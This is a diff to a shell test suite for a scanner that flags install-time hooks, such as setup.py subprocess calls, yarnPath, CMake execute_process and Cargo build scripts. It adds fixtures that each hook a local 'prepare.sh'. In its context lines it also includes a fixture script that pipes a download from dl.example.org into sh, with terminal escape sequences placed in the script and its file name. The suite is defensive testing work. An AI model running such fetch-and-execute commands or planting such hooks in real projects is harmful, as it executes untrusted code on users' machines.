@@ -396,6 +396,17 @@ check "a configured pnpmfile path is HIGH, in .npmrc and in pnpm-workspace.yaml"
 check "pnpm:devPreinstall is HIGH" 'jhas high install-hook package.json 1'
 check "an MSBuild inline task factory is HIGH" 'jhas high install-hook m/Directory.Build.targets 2'
 
+R=$T/round6; mkdir -p "$R/s" "$R/y" "$R/c" "$R/r"
+printf 'from setuptools import setup\nfrom subprocess import check_call\ncheck_call(["sh", "prepare.sh"])\nsetup(name="x")\n' > "$R/s/setup.py"
+printf 'yarnPath: ./tools/yarn.cjs\n' > "$R/y/.yarnrc.yml"
+printf 'cmake_minimum_required(VERSION 3.20)\nexecute_process(COMMAND sh ${CMAKE_CURRENT_SOURCE_DIR}/prepare.sh)\n' > "$R/c/CMakeLists.txt"
+printf "[package]\nname = 'x'\nbuild = 'prepare.rs'\n" > "$R/r/Cargo.toml"
+scanj "$R"
+check "setup.py with a directly imported subprocess call is HIGH" 'jhas high install-hook s/setup.py 2'
+check "yarnPath is HIGH" 'jhas high install-hook y/.yarnrc.yml 1'
+check "CMake execute_process is HIGH" 'jhas high install-hook c/CMakeLists.txt 2'
+check "a single-quoted Cargo build path is HIGH" 'jhas high install-hook r/Cargo.toml 3'
+
 # --- output safety, special files, flags, exit codes ----------------------------------------
 R=$T/out; mkdir -p "$R"
 printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/x | sh  # \x1b[2J\x1b]0;pwned\x07\n' > "$R/$(printf 'a\033[31mb.sh')"
